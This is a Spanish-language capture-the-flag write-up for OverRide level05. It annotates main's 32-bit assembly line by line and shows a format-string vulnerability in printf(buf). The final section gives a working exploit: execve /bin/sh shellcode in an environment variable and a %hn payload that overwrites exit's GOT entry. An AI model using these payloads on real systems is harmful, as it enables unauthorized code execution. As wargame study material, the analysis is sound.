# **ANÁLISIS COMPLETO LINEA POR LINEA - NIVEL level05**

```asm
Dump of assembler code for function main:
   0x08048444 <+0>:	    push   ebp
   0x08048445 <+1>:	    mov    ebp,esp
   0x08048447 <+3>:	    push   edi
   0x08048448 <+4>:	    push   ebx
   0x08048449 <+5>:	    and    esp,0xfffffff0
   0x0804844c <+8>:	    sub    esp,0x90
   0x08048452 <+14>:	mov    DWORD PTR [esp+0x8c],0x0
   0x0804845d <+25>:	mov    eax,ds:0x80497f0
   0x08048462 <+30>:	mov    DWORD PTR [esp+0x8],eax
   0x08048466 <+34>:	mov    DWORD PTR [esp+0x4],0x64
   0x0804846e <+42>:	lea    eax,[esp+0x28]
   0x08048472 <+46>:	mov    DWORD PTR [esp],eax
   0x08048475 <+49>:	call   0x8048350 <fgets@plt>
   0x0804847a <+54>:	mov    DWORD PTR [esp+0x8c],0x0
   0x08048485 <+65>:	jmp    0x80484d3 <main+143>
   0x08048487 <+67>:	lea    eax,[esp+0x28]
   0x0804848b <+71>:	add    eax,DWORD PTR [esp+0x8c]
   0x08048492 <+78>:	movzx  eax,BYTE PTR [eax]
   0x08048495 <+81>:	cmp    al,0x40
   0x08048497 <+83>:	jle    0x80484cb <main+135>
   0x08048499 <+85>:	lea    eax,[esp+0x28]
   0x0804849d <+89>:	add    eax,DWORD PTR [esp+0x8c]
   0x080484a4 <+96>:	movzx  eax,BYTE PTR [eax]
   0x080484a7 <+99>:	cmp    al,0x5a
   0x080484a9 <+101>:	jg     0x80484cb <main+135>
   0x080484ab <+103>:	lea    eax,[esp+0x28]
   0x080484af <+107>:	add    eax,DWORD PTR [esp+0x8c]
   0x080484b6 <+114>:	movzx  eax,BYTE PTR [eax]
   0x080484b9 <+117>:	mov    edx,eax
   0x080484bb <+119>:	xor    edx,0x20
   0x080484be <+122>:	lea    eax,[esp+0x28]
   0x080484c2 <+126>:	add    eax,DWORD PTR [esp+0x8c]
   0x080484c9 <+133>:	mov    BYTE PTR [eax],dl
   0x080484cb <+135>:	add    DWORD PTR [esp+0x8c],0x1
   0x080484d3 <+143>:	mov    ebx,DWORD PTR [esp+0x8c]
   0x080484da <+150>:	lea    eax,[esp+0x28]
   0x080484de <+154>:	mov    DWORD PTR [esp+0x1c],0xffffffff
   0x080484e6 <+162>:	mov    edx,eax
   0x080484e8 <+164>:	mov    eax,0x0
   0x080484ed <+169>:	mov    ecx,DWORD PTR [esp+0x1c]
   0x080484f1 <+173>:	mov    edi,edx
   0x080484f3 <+175>:	repnz scas al,BYTE PTR es:[edi]
   0x080484f5 <+177>:	mov    eax,ecx
   0x080484f7 <+179>:	not    eax
   0x080484f9 <+181>:	sub    eax,0x1
   0x080484fc <+184>:	cmp    ebx,eax
   0x080484fe <+186>:	jb     0x8048487 <main+67>
   0x08048500 <+188>:	lea    eax,[esp+0x28]
   0x08048504 <+192>:	mov    DWORD PTR [esp],eax
   0x08048507 <+195>:	call   0x8048340 <printf@plt>
   0x0804850c <+200>:	mov    DWORD PTR [esp],0x0
   0x08048513 <+207>:	call   0x8048370 <exit@plt>
End of assembler dump.
```

### **Líneas 0, 1, 3, 4, 5, 8, 14 y 25:**
```asm
0x08048444 <+0>:	   push   ebp
0x08048445 <+1>:	   mov    ebp,esp
0x08048447 <+3>:	   push   edi
0x08048448 <+4>:	   push   ebx
0x08048449 <+5>:	   and    esp,0xfffffff0
0x0804844c <+8>:	   sub    esp,0x90
0x08048452 <+14>:    mov    DWORD PTR [esp+0x8c],0x0
0x0804845d <+25>:    mov    eax,ds:0x80497f0
```

1. <+0>: Guarda en lo alto del stack el valor de `EBP` (cpu) `[esp + 0x00]`. El `esp` se desplaza 4 bytes hacia abajo.
2. <+1>: Asigna en nuevo `esp` a `ebp` para la función `main`
3. <+3>: Guarda en el stack de `main()` el registro `edi` para usarlo más adelante
4. <+4>: Guarda en el stack de `main()` el registro `ebx` para usarlo más adelante
5. <+5>: Alinea el stack a múltiplo de 16. (los últimos 4 bytes se ponene a 0).
6. <+8>: Reserva (desplaza) `144 bytes` (0x90) en el stack de `main()` para que el compilador organice las varibles locales y los argumentos de las funciones que `main()` va a llamar.
7. <+14>: Inicializa a 0 la variable local i (contador del bucle) que se encuentra en [esp+0x8c].
8. <+25>: Carga en `eax` el puntero al stream stdin, Será el tercer argumento de `fgets()`.

### **Líneas 30, 34, 42, 46 y 49:**
```asm
0x08048462 <+30>:	mov    DWORD PTR [esp+0x8],eax
0x08048466 <+34>:	mov    DWORD PTR [esp+0x4],0x64
0x0804846e <+42>:	lea    eax,[esp+0x28]
0x08048472 <+46>:	mov    DWORD PTR [esp],eax
0x08048475 <+49>:	call   0x8048350 <fgets@plt>
```

1. <+30>: Copia `stdin` en `[esp+0x8]`. Es el tercer argumento de `fgets()`: el stream de lectura.
2. <+34>: Escribe 100 (0x64) en `[esp+0x4]`. Es el segundo argumento de `fgets()`: número máximo de bytes a leer.
3. <+42>: Calcula la dirección de `[esp+0x28]` que es la variable local `buf` y la carga en `eax`.
4. <+46>: Copia en lo alto del stack el registo `eax`
5. <+49>: Llama a la función: `fgets()`.

### **Líneas 54, 65, 67, 71, 78, 81 y 83:**
```asm
0x0804847a <+54>:	mov    DWORD PTR [esp+0x8c],0x0
0x08048485 <+65>:	jmp    0x80484d3 <main+143>
0x08048487 <+67>:	lea    eax,[esp+0x28]
0x0804848b <+71>:	add    eax,DWORD PTR [esp+0x8c]
0x08048492 <+78>:	movzx  eax,BYTE PTR [eax]
0x08048495 <+81>:	cmp    al,0x40
0x08048497 <+83>:	jle    0x80484cb <main+135>
```

1. <+54>: Reinicializa a 0 la variable `i` `[esp+0x8c]`. Prepara el contador para el bucle de conversión.
2. <+65>: Salta a la línea `<main+143>`
3. <+67>: Calcula la dirección de `[esp+0x28]` y la carga en `eax`
4. <+71>: Suma el contador `i` a la dirección base de `buf`. Calcula la dirección del byte actual `buf[i]`.
5. <+78>: Carga en `eax` el byte actual `buf[i]`.
6. <+81>: Compara `buf[i]` con `0x40` (`@`). Límite inferior del rango de mayúsculas.
7. <+83>: `jle`. Si `buf[i] <= 0x40` no es mayúscula, salta a `<+135>` (incrementa `i`).

### **Líneas 85, 89, 96, 99 y 101:**
```asm
0x08048499 <+85>:	lea    eax,[esp+0x28]
0x0804849d <+89>:	add    eax,DWORD PTR [esp+0x8c]
0x080484a4 <+96>:	movzx  eax,BYTE PTR [eax]
0x080484a7 <+99>:	cmp    al,0x5a
0x080484a9 <+101>:	jg     0x80484cb <main+135>
```

1. <+85>: Calcula la dirección de `[esp+0x28]` que es la variable local `buf` y la carga en `eax`.
2. <+89>: Suma el contador `i` a la dirección base de `buf`. Calcula la dirección del byte actual `buf[i]`.
3. <+96>: Carga en `EAX` el byte actual `buf[i]`.
4. <+99>: Compara `buf[i]` con `0x5a` (`Z`). Límite superior del rango de mayúsculas.
5. <+101>: `jg`. Si `buf[i] > 0x5a` no es mayúscula, salta a `<+135>` (incrementa `i`).

### **Líneas 103 - 143:**
```asm
0x080484ab <+103>:	lea    eax,[esp+0x28]
0x080484af <+107>:	add    eax,DWORD PTR [esp+0x8c]
0x080484b6 <+114>:	movzx  eax,BYTE PTR [eax]
0x080484b9 <+117>:	mov    edx,eax
0x080484bb <+119>:	xor    edx,0x20
0x080484be <+122>:	lea    eax,[esp+0x28]
0x080484c2 <+126>:	add    eax,DWORD PTR [esp+0x8c]
0x080484c9 <+133>:	mov    BYTE PTR [eax],dl
0x080484cb <+135>:	add    DWORD PTR [esp+0x8c],0x1
0x080484d3 <+143>:	mov    ebx,DWORD PTR [esp+0x8c]
```

1. <+103>: Calcula la dirección de `[esp+0x28]` que es la variable local `buf` y la carga en `EAX`.
2. <+107>: Suma el contador `i` a la dirección base de `buf`. Calcula la dirección del byte actual `buf[i]`.
3. <+114>: Carga en `EAX` el byte actual `buf[i]`.
4. <+117>: Copia `buf[i]` en `EDX`.
5. <+119>: Aplica `XOR 0x20` a `EDX`. Convierte la mayúscula a minúscula.
6. <+122>: Calcula de nuevo la dirección base de `buf` en `EAX`.
7. <+126>: Suma el contador `i`. Obtiene de nuevo la dirección de `buf[i]`.
8. <+133>: Escribe el byte convertido `DL` en `buf[i]`. Sobreescribe la mayúscula con la minúscula.
9. <+135>: Incrementa el contador `i` en 1. Avanza al siguiente byte.
10. <+143>: Carga el valor actualizado de `i` en `EBX` para la condición del bucle.

### **Líneas 150, 154, 162, 164, 169, 173, 175, 177, 179, 181, 184 y 186:**
```asm
0x080484da <+150>:	lea    eax,[esp+0x28]
0x080484de <+154>:	mov    DWORD PTR [esp+0x1c],0xffffffff
0x080484e6 <+162>:	mov    edx,eax
0x080484e8 <+164>:	mov    eax,0x0
0x080484ed <+169>:	mov    ecx,DWORD PTR [esp+0x1c]
0x080484f1 <+173>:	mov    edi,edx
0x080484f3 <+175>:	repnz scas al,BYTE PTR es:[edi]
0x080484f5 <+177>:	mov    eax,ecx
0x080484f7 <+179>:	not    eax
0x080484f9 <+181>:	sub    eax,0x1
0x080484fc <+184>:	cmp    ebx,eax
0x080484fe <+186>:	jb     0x8048487 <main+67>
```

1.  <+150>: Calcula la dirección de `[esp+0x28]` que es la variable local `buf` y la carga en `eax`.
2.  <+154>: Escribe `0xffffffff` en `[esp+0x1c]`. Inicializa el contador de `repnz scas` a -1.
3.  <+162>: Copia `EAX` en `EDX` — guarda la dirección base de `buf`.
4.  <+164>: Pone `EAX` a 0. Byte que buscará `repnz scas` (el terminador `\0`).
5.  <+169>: Carga `0xffffffff` en `ECX` — contador del bucle `repnz scas`.
6.  <+173>: Copia la dirección de `buf` en `EDI` — destino de `repnz scas`.
7.  <+175>: `repnz scas`. Recorre `buf` byte a byte hasta encontrar el `\0`. Es el equivalente ensamblador de `strlen()`.
8.  <+177>: Copia el resultado de `ECX` en `EAX`.
9.  <+179>: Aplica `NOT EAX`. Invierte todos los bits.
10. <+181>: Resta 1 a `EAX`. Obtiene la longitud real del string.
11. <+184>: Compara el contador `i` (en `EBX`) con la longitud del string.
12. <+186>: `jb`. Si `i < strlen(buf)` vuelve a `<+67>` para continuar el bucle.

### **Líneas 188, 192, 195, 200 y 207:**

1. <+188>: Calcula la dirección de `[esp+0x28]` que es la variable local `buf` y la carga en `EAX`.
2. <+192>: Copia en lo alto del stack la dirección de `buf`. Único argumento de `printf()`.
3. <+195>: Llama a `printf(buf)`.Aquí está la vulnerabilidad **Format String**: `buf` se pasa directamente como formato sin sanitizar.
4. <+200>: Escribe `0` en lo alto del stack. Argumento de `exit()`: código de salida.
5. <+207>: Llama a `exit(0)`. Termina el programa.

# Resumen del Flujo de Ataque para el Nivel 05

## 1. Lectura:

La vulnerabilidad está en la línea `<+195>` de `main`:

```asm
0x08048507 <+195>: call   0x8048340 <printf@plt>
```
```c
printf(buf);
```
`printf` recibe `buf` directamente como formato sin sanitizar.

---

## 2. Vulnerabilidad:

* `buf` se inicializa en `[esp+0x28]` con 100 bytes leídos por `fgets()`.
* El bucle `for` convierte mayúsculas a minúsculas — los bytes entre
  `0x41` y `0x5a` serán modificados. El shellcode no puede ir en `buf`.
* `printf(buf)` sin especificador — permite **escribir** valores arbitrarios
  en memoria con `%n`.
* No hay `system()` en el binario — no podemos hacer Ret2Libc directamente.
* **NX está OFF** — el stack y el heap permiten ejecución de shellcode.
* `.got.plt` es escribible `(WA)` — podemos sobrescribir la entrada de
  `exit()` con la dirección de nuestro shellcode.

---

## 3. Explotación:

* **Paso 1:** Localizamos en qué posición del stack aparece `buf` usando `%x`
  — confirmamos que está en la posición **10**.
* **Paso 2:** Localizamos la dirección de `exit()` en la `.got.plt`:
```bash
level05@OverRide:~$ objdump -R ./level05 | grep exit
080497e0 R_386_JUMP_SLOT   exit
```
* **Paso 3:** Almacenamos el shellcode en una variable de entorno para evitar
  que el bucle de conversión lo modifique:
```bash
export SHELLCODE=$(python -c 'print "\x90"*128 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"')
```
* **Paso 4:** Encontramos la dirección del shellcode compilando un programa auxiliar:
```bash
gcc -m32 /tmp/addr.c -o /tmp/addr && /tmp/addr
0xffffd863
```
* **Paso 5:** Construimos el payload con Format String Write para
  sobrescribir `exit@got` con la dirección del shellcode:
```bash
(python -c 'print "\xe0\x97\x04\x08\xe2\x97\x04\x08%55387x%10$hn%10140x%11$hn"'; cat) | ./level05
```
* Cuando el programa llame a `exit(0)` saltará al NOP sled de la variable de entorno y ejecutará el shellcode que lanza `/bin/sh`.